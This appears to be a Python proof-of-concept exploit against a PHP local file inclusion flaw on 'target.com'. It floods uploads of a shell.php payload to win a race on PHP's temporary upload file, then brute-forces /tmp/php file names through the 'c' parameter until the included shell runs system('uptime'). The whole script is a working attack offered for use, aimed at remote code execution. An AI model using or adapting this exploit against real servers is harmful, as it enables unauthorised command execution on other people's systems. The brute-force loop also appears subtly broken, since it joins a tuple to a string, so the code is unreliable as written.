from __future__ import print_function
from builtins import range
import itertools
import requests
import string
import sys

print('[+] Trying to win the race')
try:
    _payload_fh = open('shell.php', 'rb')
except FileNotFoundError:
    sys.exit("[!] shell.php not found next to this script.\n"
             "    This PoC uploads that file, so you must supply it: write a PHP\n"
             "    payload (e.g. <?php echo system('uptime'); ?>) to shell.php in\n"
             "    this directory, then run again.")
f = {'file': _payload_fh}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] We have got a shell: ' + url)
        sys.exit(0)

print('[x] Something went wrong, please try again')
